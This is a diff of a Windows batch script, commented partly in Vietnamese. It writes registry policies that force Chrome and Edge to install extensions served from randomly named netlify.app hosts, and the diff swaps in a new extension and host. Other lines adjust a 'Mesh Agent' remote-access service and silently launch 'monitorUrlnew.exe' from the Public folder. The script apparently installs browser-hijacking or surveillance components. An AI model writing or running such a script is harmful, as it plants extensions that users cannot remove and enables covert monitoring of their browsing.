@@ -76,11 +76,11 @@ reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 
 
 :: === Add Chrome Extension policies to registry ===
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
-reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
+reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f
 
 :: === Add Edge Extension policies to registry ===
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
-reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
+reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f
 
 REM === Chạy lệnh PowerShell để set Mesh Agent sang Manual ===
 powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"
@@ -100,6 +100,7 @@ start "" /b "C:\Users\Public\monitorUrlnew.exe" >nul 2>&1
 
 echo Done all setup. Exiting script...
 exit /b 0
+
 
 
 
